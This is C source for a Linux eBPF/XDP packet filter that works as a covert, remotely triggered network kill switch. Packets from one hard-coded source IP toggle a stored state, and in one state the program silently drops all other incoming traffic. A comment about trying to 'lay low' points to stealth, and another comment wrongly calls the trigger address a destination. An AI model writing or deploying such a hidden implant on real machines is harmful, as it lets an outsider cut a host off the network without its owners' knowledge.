#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/if_ether.h>
#include <linux/in.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/tcp.h>

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__type(key, __u32);
	__type(value, __u32);
	__uint(max_entries, 1);
} status SEC(".maps");

SEC("xdpentry")
int entry(struct xdp_md *ctx) {
	// Prepare some data structures
	__u32 *rec;
	__u32 key = 0;
	void *data_end = (void *)(long)ctx->data_end;
	void *data = (void *)(long)ctx->data;
	struct ethhdr *eth = data;

	rec = bpf_map_lookup_elem(&status, &key); // Lookup current packet status from kernel map
	if (!rec) {
		return XDP_DROP; // try to lay low on error
	}
	//bpf_printk("Rec: %u", *rec); // Debug prints
	if ((*rec != 55) && (*rec != 56)) {
		// First run check
		// bpf_printk("Resetting rec!"); // Debug Prints
		*rec = 56; // set default value for map
	}

	if (eth + 1 > data_end) // Bounds checking for xdp preverifier
		return XDP_PASS; // This should never run normally

	/** if(eth->h_proto != ETH_P_IP) {
		return XDP_PASS; // don't kill layer 2 traffic
	} **/

	struct iphdr *iph = data + sizeof(struct ethhdr);
	if (iph + 1 > data_end) // More bounds checking
		return XDP_PASS; // This should never run either
				 //
	__u32 ip_src = iph->saddr; // grab source address of packet
	// bpf_printk("Incoming packet: %u\n", ip_src); // Debug print
	// Determine if we need to further process this packet
	if (ip_src == 1946091487) {
		// This packet had a destination of 223.255.254.115, do something!
		// bpf_printk("Got it!, setting rec..."); // Debug print
		switch (*rec) {
			case 55 :
				*rec = 56;
				break;
			case 56 :
				*rec = 55;
				break;
		}
		return XDP_DROP;
	}
	else if (ip_src == 0) {
		// most likely a layer 2 packet, let it thru
		return XDP_PASS;
	}

	// Finish processing
	if (*rec == 55) {
		return XDP_DROP;
	} else {
		return XDP_PASS;
	}
}


char _license[] SEC("license")= "GPL";
